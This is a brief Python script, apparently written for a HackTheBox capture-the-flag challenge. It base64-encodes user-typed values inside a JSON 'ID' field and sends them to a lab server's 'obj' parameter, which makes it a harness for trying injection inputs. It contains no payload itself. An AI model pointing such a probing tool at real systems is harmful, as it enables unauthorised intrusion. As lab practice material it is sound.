import requests
import base64

URL = "http://docker.hackthebox.eu:31146/"

def generateParamValue(query):
	value = '{"ID":"'
	value += str(query) + '"}'
	print("[+] Parameter value set to : {}".format(value))
	print("[+] Converting to base64")
	payload = {"obj" : base64.b64encode(value.encode('utf-8'))}
	print("[+] Sending request")
	r = requests.get(URL, params = payload)
	print(r.text)

if "__main__" in __name__:
	print("[+] Starting")
	while True:
		_query = input("[-] Please enter value : ")
		if _query == 'q':
			break
		generateParamValue(_query)
